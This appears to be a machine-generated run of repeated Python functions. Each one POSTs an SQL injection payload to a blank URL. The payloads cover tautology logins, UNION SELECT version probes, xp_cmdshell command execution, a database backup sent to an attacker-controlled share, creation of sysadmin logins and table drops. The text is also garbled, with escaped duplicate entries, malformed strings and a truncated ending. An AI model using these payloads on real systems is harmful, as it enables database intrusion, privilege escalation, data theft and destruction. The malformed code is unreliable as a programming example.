                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'%20or%20'x'='x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22')%20or%20('x'='x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 0=0 --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 0=0 #\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 #\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or '1'='1'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1 --'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1 or ''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1 or \\x22\\x22=\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or a=a--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or a=a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or ('a'='a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'hi' or 'x'='x';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22procedure\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22handler\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or username like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or uname like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or userid like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or uid like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or user like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'; exec master..xp_cmdshell\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'; exec xp_regread\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22t'exec master..xp_cmdshell 'nslookup www.google.com'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22--sp_password\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' UNION SELECT\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' UNION ALL SELECT\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or (EXISTS)\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' (select top 1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'||UTL_HTTP.REQUEST\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221;SELECT%20*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22<>\x22'%;)(&+\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'%20or%201=1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'sqlattempt1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%28\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%26\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%21\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or ''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 3=3\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x18 or 3=3 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select \x40\x40version\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select \x40\x40servernamee\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select \x40\x40microsoftversione\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select * from master..sysserverse\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select * from sysusers\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22exec master..xp_cmdshell 'ipconfig+/all'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22exec master..xp_cmdshell 'net+view'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22exec master..xp_cmdshell 'net+users'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22exec master..xp_cmdshell 'ping+<attackerip>'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22create table myfile (line varchar(8000))\x22 bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'\x22 select * from myfile\x22--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22# you will need to customize/modify some of the vaules in the queries for best effect\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'; exec master..xp_cmdshell 'ping 10.10.1.2'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'create user name identified by 'pass123' --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'create user name identified by pass123 temporary tablespace temp default tablespace users;\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' ; drop table temp --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'exec sp_addlogin 'name' , 'password' --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' exec sp_addsrvrolemember 'name' , 'sysadmin' --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' grant connect to name; grant resource to name; --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1 --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' union (select @@version) --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' union (select NULL, (select @@version)) --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' union (select NULL, NULL, (select @@version)) --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' union (select NULL, NULL, NULL,  (select @@version)) --\x22}
                    try:
